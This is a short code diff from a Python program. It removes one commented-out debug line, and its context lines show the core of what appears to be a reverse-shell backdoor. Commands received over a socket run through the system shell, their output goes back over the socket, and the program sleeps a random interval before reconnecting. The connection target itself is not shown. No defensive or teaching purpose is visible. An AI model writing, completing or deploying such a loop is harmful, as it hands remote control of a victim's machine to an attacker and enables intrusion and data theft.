@@ -61,7 +61,6 @@ def main():
 		process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		stdout_val = process.stdout.read() + process.stderr.read()
 		sock.send(stdout_val)
-		#sock.send(data)#testing
 	sock.close()
 	time.sleep(randint(10, 30))
 	main()
